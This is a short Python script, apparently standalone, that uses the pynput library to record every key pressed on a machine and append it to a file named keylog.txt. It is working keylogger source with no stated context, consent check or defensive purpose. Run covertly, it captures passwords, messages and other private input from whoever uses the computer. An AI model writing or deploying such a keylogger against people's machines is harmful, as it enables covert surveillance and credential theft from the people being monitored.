from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as f:
        if hasattr(key, 'char') and key.char is not None:
            f.write(key.char)
        else:
            f.write(f"<{key}>")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
